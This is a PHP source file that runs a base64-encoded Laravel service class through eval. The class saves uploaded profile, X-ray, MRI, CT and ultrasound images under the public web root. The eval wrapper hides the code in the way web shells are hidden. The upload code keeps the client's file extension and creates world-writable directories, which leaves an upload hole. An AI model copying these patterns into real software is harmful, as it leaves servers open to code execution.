<?php @eval("?>".base64_decode("PD9waHAgbmFtZXNwYWNlIEFwcFxTZXJ2aWNlczsNCg0KdXNlIElsbHVtaW5hdGVcQXV0aFxNaWRkbGV3YXJlXEF1dGhlbnRpY2F0ZTsNCg0KDQoJQ2xhc3MgQ3JlYXRlZmlsZSB7DQoJCXB1YmxpYyBmdW5jdGlvbiBwdWJsaWNfcGF0aCgpew0KCQkJcmV0dXJuIHN0cl9yZXBsYWNlKCJwdWJsaWMiLCJwdWJsaWNfaHRtbCIscHVibGljX3BhdGgoKSk7DQoJCX0NCg0KICAgICAgICBwdWJsaWMgZnVuY3Rpb24gdXBsb2FkSW1hZ2UoJGZpbGUpew0KCSAgICAgICAgICAgLy8gZWNobyAnaW4gY2xhc3MnOw0KCSAgICAgICAgICAgICR1c2VySWQgPSBhdXRoKCktPnVzZXIoKS0+aWQ7DQoJICAgICAgICAgICAvLyB2YXJfZHVtcCgkdXNlcklkKTsNCgkgICAgICAgICAvLyAgICRpbnB1dCA9ICRyZXF1ZXN0LT5hbGwoKTsNCg0KCSAgICAgICAgICAvLyAgdmFyX2R1bXAoJ2lucHV0JywgJGlucHV0KTsNCg0KCSAgICAgICAgICAgIC8vJGZpbGUgPSAkaW5wdXRbJ2ZpbGUnXTsNCg0KCSAgICAgICAgIC8vICAgdmFyX2R1bXAoJGZpbGUpOw0KDQoJICAgICAgICAgICAgDQoJICAgICAgLy8gICRmaWxlID0gSW5wdXQ6OmZpbGUoJ2ZpbGUnKTsNCgkgICAgICAgIC8vICAgIHZhcl9kdW1wKGRhdGUoIlktbS1kIEg6aTpzIikpOw0KCSAgICAgICAgaWYgKCRmaWxlIT1udWxsKSB7DQoNCgkgICAgICAgICAgICAkZXh0ID0gJGZpbGUtPmdldENsaWVudE9yaWdpbmFsRXh0ZW5zaW9uKCk7DQoJICAgICAgICAgICAgJGltYWdlX25hbWUgPSBkYXRlKCJZLW0tZCIpLnN0cl9yYW5kb20oMTUpLiR1c2VySWQuJy4nLiRleHQ7DQoJICAgICAgICB9DQoNCgkgICAgICAgIC8vdmFyX2R1bXAoJ2ltYWdlIG5hbWUnLCAkaW1hZ2VfbmFtZSk7DQoNCgkgICAgICAvLyB2YXJfZHVtcCgnZmlsZXBhdGgnLCAkdGhpcy0+cHVibGljX3BhdGgoKSk7DQoJICAgICAgIC8vICRwdWJsaWNfcGF0aCA9IHN0cl9yZXBsYWNlKCJwdWJsaWMiLCJwdWJsaWNfaHRtbCIscHVibGljX3BhdGgoKSk7DQoJICAgICAgIC8vIHZhcl9kdW1wKCRwdWJsaWNfcGF0aCk7DQoNCgkgICAgICAgIGlmICghZmlsZV9leGlzdHMoJHRoaXMtPnB1YmxpY19wYXRoKCkuJy91cGxvYWRzL2ltYWdlcy9wcm9maWxlJykpIHsNCgkgICAgICAgIC8vIGlmICghZmlsZV9leGlzdHMoJy9tcmdwL3B1YmxpYy91cGxvYWRzL2ltYWdlcycpKSB7DQoNCgkgICAgICAgICAgICBta2RpcigkdGhpcy0+cHVibGljX3BhdGgoKS4nL3VwbG9hZHMvaW1hZ2VzL3Byb2ZpbGUnLDA3NzcsIHRydWUpOw0KCSAgICAgICAgfQ0KDQoJICAgICAgICAvL0ltYWdlOjptYWtlKElucHV0OjpmaWxlKCdmaWxlJykpLT5zYXZlKCcvdXBsb2Fkcy9pbWFnZXMvJy4kaW1hZ2VfbmFtZSk7DQoJICAgICAgICAgJGZpbGUtPm1vdmUoJHRoaXMtPnB1YmxpY19wYXRoKCkuJy91cGxvYWRzL2ltYWdlcy9wcm9maWxlJywgJGltYWdlX25hbWUpOw0KCSAgICAgICAgJHJlcGx5WydpbWFnZUxpbmsnXSA9ICdcXHVwbG9hZHNcXGltYWdlc1xccHJvZmlsZVxcJy4kaW1hZ2VfbmFtZTsNCgkgICAgICAgLy8gdmFyX2R1bXAoJHJlcGx5KTsNCgkgICAgICAgIHJldHVybiByZXNwb25zZSgkcmVwbHkpOw0KICAgICAJfQ0KDQoNCiAgICAgCSNVcGxvYWQgWC1SYXkNCiAgICAgCSAgIHB1YmxpYyBmdW5jdGlvbiB1cGxvYWRYcmF5KCRmaWxlKXsNCgkgICAgICAgICAgIC8vIGVjaG8gJ2luIGNsYXNzJzsNCgkgICAgICAgICAgICAkdXNlcklkID0gYXV0aCgpLT51c2VyKCktPmlkOw0KDQoJICAgICAgICBpZiAoJGZpbGUhPW51bGwpIHsNCg0KCSAgICAgICAgICAgICRleHQgPSAkZmlsZS0+Z2V0Q2xpZW50T3JpZ2luYWxFeHRlbnNpb24oKTsNCgkgICAgICAgICAgICAkaW1hZ2VfbmFtZSA9IGRhdGUoIlktbS1kIikuc3RyX3JhbmRvbSgxNSkuJHVzZXJJZC4nLicuJGV4dDsNCgkgICAgICAgIH0NCg0KCSAgICAgICAgLy92YXJfZHVtcCgnaW1hZ2UgbmFtZScsICRpbWFnZV9uYW1lKTsNCg0KCSAgICAgICAvLyB2YXJfZHVtcCgnZmlsZXBhdGgnLCBwdWJsaWNfcGF0aCgpKTsNCg0KCSAgICAgICAgaWYgKCFmaWxlX2V4aXN0cygkdGhpcy0+cHVibGljX3BhdGgoKS4nL3VwbG9hZHMvaW1hZ2VzL1hSYXknKSkgew0KCSAgICAgICAgLy8gaWYgKCFmaWxlX2V4aXN0cygnL21yZ3AvcHVibGljL3VwbG9hZHMvaW1hZ2VzJykpIHsNCg0KCSAgICAgICAgICAgIG1rZGlyKCR0aGlzLT5wdWJsaWNfcGF0aCgpLicvdXBsb2Fkcy9pbWFnZXMvWFJheScsMDc3NywgdHJ1ZSk7DQoJICAgICAgICB9DQoNCgkgICAgICAgIC8vSW1hZ2U6Om1ha2UoSW5wdXQ6OmZpbGUoJ2ZpbGUnKSktPnNhdmUoJy91cGxvYWRzL2ltYWdlcy8nLiRpbWFnZV9uYW1lKTsNCgkgICAgICAgICAkZmlsZS0+bW92ZSgkdGhpcy0+cHVibGljX3BhdGgoKS4nL3VwbG9hZHMvaW1hZ2VzL1hSYXknLCAkaW1hZ2VfbmFtZSk7DQoJICAgICAgICAkcmVwbHlbJ2ltYWdlTGluayddID0gJ1xcdXBsb2Fkc1xcaW1hZ2VzXFxYUmF5XFwnLiRpbWFnZV9uYW1lOw0KCSAgICAgICAvLyB2YXJfZHVtcCgkcmVwbHkpOw0KCSAgICAgICAgcmV0dXJuIHJlc3BvbnNlKCRyZXBseSk7DQogICAgIAl9DQoNCiAgICAgCXB1YmxpYyBmdW5jdGlvbiB1cGxvYWRNUkkoJGZpbGUpew0KCSAgICAgICAgICAgLy8gZWNobyAnaW4gY2xhc3MnOw0KCSAgICAgICAgICAgICR1c2VySWQgPSBhdXRoKCktPnVzZXIoKS0+aWQ7DQoNCgkgICAgICAgIGlmICgkZmlsZSE9bnVsbCkgew0KDQoJICAgICAgICAgICAgJGV4dCA9ICRmaWxlLT5nZXRDbGllbnRPcmlnaW5hbEV4dGVuc2lvbigpOw0KCSAgICAgICAgICAgICRpbWFnZV9uYW1lID0gZGF0ZSgiWS1tLWQiKS5zdHJfcmFuZG9tKDE1KS4kdXNlcklkLicuJy4kZXh0Ow0KCSAgICAgICAgfQ0KDQoJICAgICAgICAvL3Zhcl9kdW1wKCdpbWFnZSBuYW1lJywgJGltYWdlX25hbWUpOw0KDQoJICAgICAgIC8vIHZhcl9kdW1wKCdmaWxlcGF0aCcsIHB1YmxpY19wYXRoKCkpOw0KDQoJICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCR0aGlzLT5wdWJsaWNfcGF0aCgpLicvdXBsb2Fkcy9pbWFnZXMvTVJJJykpIHsNCgkgICAgICAgIC8vIGlmICghZmlsZV9leGlzdHMoJy9tcmdwL3B1YmxpYy91cGxvYWRzL2ltYWdlcycpKSB7DQoNCgkgICAgICAgICAgICBta2RpcigkdGhpcy0+cHVibGljX3BhdGgoKS4nL3VwbG9hZHMvaW1hZ2VzL01SSScsMDc3NywgdHJ1ZSk7DQoJICAgICAgICB9DQoNCgkgICAgICAgIC8vSW1hZ2U6Om1ha2UoSW5wdXQ6OmZpbGUoJ2ZpbGUnKSktPnNhdmUoJy91cGxvYWRzL2ltYWdlcy8nLiRpbWFnZV9uYW1lKTsNCgkgICAgICAgICAkZmlsZS0+bW92ZSgkdGhpcy0+cHVibGljX3BhdGgoKS4nL3VwbG9hZHMvaW1hZ2VzL01SSScsICRpbWFnZV9uYW1lKTsNCgkgICAgICAgICRyZXBseVsnaW1hZ2VMaW5rJ10gPSAnXFx1cGxvYWRzXFxpbWFnZXNcXE1SSVxcJy4kaW1hZ2VfbmFtZTsNCgkgICAgICAgLy8gdmFyX2R1bXAoJHJlcGx5KTsNCgkgICAgICAgIHJldHVybiByZXNwb25zZSgkcmVwbHkpOw0KICAgICAJfQ0KDQogICAgIAlwdWJsaWMgZnVuY3Rpb24gdXBsb2FkQ1QoJGZpbGUpew0KCSAgICAgICAgICAgLy8gZWNobyAnaW4gY2xhc3MnOw0KCSAgICAgICAgICAgICR1c2VySWQgPSBhdXRoKCktPnVzZXIoKS0+aWQ7DQoNCgkgICAgICAgIGlmICgkZmlsZSE9bnVsbCkgew0KDQoJICAgICAgICAgICAgJGV4dCA9ICRmaWxlLT5nZXRDbGllbnRPcmlnaW5hbEV4dGVuc2lvbigpOw0KCSAgICAgICAgICAgICRpbWFnZV9uYW1lID0gZGF0ZSgiWS1tLWQiKS5zdHJfcmFuZG9tKDE1KS4kdXNlcklkLicuJy4kZXh0Ow0KCSAgICAgICAgfQ0KDQoJICAgICAgICAvL3Zhcl9kdW1wKCdpbWFnZSBuYW1lJywgJGltYWdlX25hbWUpOw0KDQoJICAgICAgIC8vIHZhcl9kdW1wKCdmaWxlcGF0aCcsIHB1YmxpY19wYXRoKCkpOw0KDQoJICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCR0aGlzLT5wdWJsaWNfcGF0aCgpLicvdXBsb2Fkcy9pbWFnZXMvQ1QnKSkgew0KCSAgICAgICAgLy8gaWYgKCFmaWxlX2V4aXN0cygnL21yZ3AvcHVibGljL3VwbG9hZHMvaW1hZ2VzJykpIHsNCg0KCSAgICAgICAgICAgIG1rZGlyKCR0aGlzLT5wdWJsaWNfcGF0aCgpLicvdXBsb2Fkcy9pbWFnZXMvQ1QnLDA3NzcsIHRydWUpOw0KCSAgICAgICAgfQ0KDQoJICAgICAgICAvL0ltYWdlOjptYWtlKElucHV0OjpmaWxlKCdmaWxlJykpLT5zYXZlKCcvdXBsb2Fkcy9pbWFnZXMvJy4kaW1hZ2VfbmFtZSk7DQoJICAgICAgICAgJGZpbGUtPm1vdmUoJHRoaXMtPnB1YmxpY19wYXRoKCkuJy91cGxvYWRzL2ltYWdlcy9DVCcsICRpbWFnZV9uYW1lKTsNCgkgICAgICAgICRyZXBseVsnaW1hZ2VMaW5rJ10gPSAnXFx1cGxvYWRzXFxpbWFnZXNcXENUXFwnLiRpbWFnZV9uYW1lOw0KCSAgICAgICAvLyB2YXJfZHVtcCgkcmVwbHkpOw0KCSAgICAgICAgcmV0dXJuIHJlc3BvbnNlKCRyZXBseSk7DQogICAgIAl9DQoNCiAgICAgCXB1YmxpYyBmdW5jdGlvbiB1cGxvYWRVUygkZmlsZSl7DQoJICAgICAgICAgICAvLyBlY2hvICdpbiBjbGFzcyc7DQoJICAgICAgICAgICAgJHVzZXJJZCA9IGF1dGgoKS0+dXNlcigpLT5pZDsNCg0KCSAgICAgICAgaWYgKCRmaWxlIT1udWxsKSB7DQoNCgkgICAgICAgICAgICAkZXh0ID0gJGZpbGUtPmdldENsaWVudE9yaWdpbmFsRXh0ZW5zaW9uKCk7DQoJICAgICAgICAgICAgJGltYWdlX25hbWUgPSBkYXRlKCJZLW0tZCIpLnN0cl9yYW5kb20oMTUpLiR1c2VySWQuJy4nLiRleHQ7DQoJICAgICAgICB9DQoNCgkgICAgICAgIC8vdmFyX2R1bXAoJ2ltYWdlIG5hbWUnLCAkaW1hZ2VfbmFtZSk7DQoNCgkgICAgICAgLy8gdmFyX2R1bXAoJ2ZpbGVwYXRoJywgcHVibGljX3BhdGgoKSk7DQoNCgkgICAgICAgIGlmICghZmlsZV9leGlzdHMoJHRoaXMtPnB1YmxpY19wYXRoKCkuJy91cGxvYWRzL2ltYWdlcy9VUycpKSB7DQoJICAgICAgICAvLyBpZiAoIWZpbGVfZXhpc3RzKCcvbXJncC9wdWJsaWMvdXBsb2Fkcy9pbWFnZXMnKSkgew0KDQoJICAgICAgICAgICAgbWtkaXIoJHRoaXMtPnB1YmxpY19wYXRoKCkuJy91cGxvYWRzL2ltYWdlcy9VUycsMDc3NywgdHJ1ZSk7DQoJICAgICAgICB9DQoNCgkgICAgICAgIC8vSW1hZ2U6Om1ha2UoSW5wdXQ6OmZpbGUoJ2ZpbGUnKSktPnNhdmUoJy91cGxvYWRzL2ltYWdlcy8nLiRpbWFnZV9uYW1lKTsNCgkgICAgICAgICAkZmlsZS0+bW92ZSgkdGhpcy0+cHVibGljX3BhdGgoKS4nL3VwbG9hZHMvaW1hZ2VzL1VTJywgJGltYWdlX25hbWUpOw0KCSAgICAgICAgJHJlcGx5WydpbWFnZUxpbmsnXSA9ICdcXHVwbG9hZHNcXGltYWdlc1xcVVNcXCcuJGltYWdlX25hbWU7DQoJICAgICAgIC8vIHZhcl9kdW1wKCRyZXBseSk7DQoJICAgICAgICByZXR1cm4gcmVzcG9uc2UoJHJlcGx5KTsNCiAgICAgCX0NCg0KCX0NCg0KPz4="));